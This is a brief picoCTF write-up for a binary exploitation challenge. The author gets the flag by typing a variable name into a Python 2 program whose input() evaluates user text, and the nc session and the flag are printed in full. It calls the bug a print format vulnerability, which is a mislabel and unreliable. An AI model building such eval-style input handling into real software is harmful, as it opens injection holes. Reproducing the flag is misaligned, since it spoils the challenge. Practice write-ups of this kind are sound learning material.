# picoCTF What's your input Write Up

## Details:
Points: 50

Jeopardy style CTF

Category: Binary Exploitation

Comments: We'd like to get your input on a couple things. Think you can answer my questions correctly? in.py nc mercury.picoctf.net 61858.

## Write up:

Looking at the python we can see that it is python 2 and that this is obviously a print format vulnerability.

Looking into the vulnerability a bit more I saw that I can simply type the name of the variable I want to print and it will print it. I then connected to the server and tried my "exploit":

```
nc mercury.picoctf.net 61858                                         1 ⨯
What's your favorite number?
Number? city
You said: Round Lake Beach
Okay...
What's the best city to visit?
City? city
You said: Round Lake Beach
I agree!
picoCTF{v4lua4bl3_1npu7_7607377}
```

The flag was:

```
picoCTF{v4lua4bl3_1npu7_7607377}
```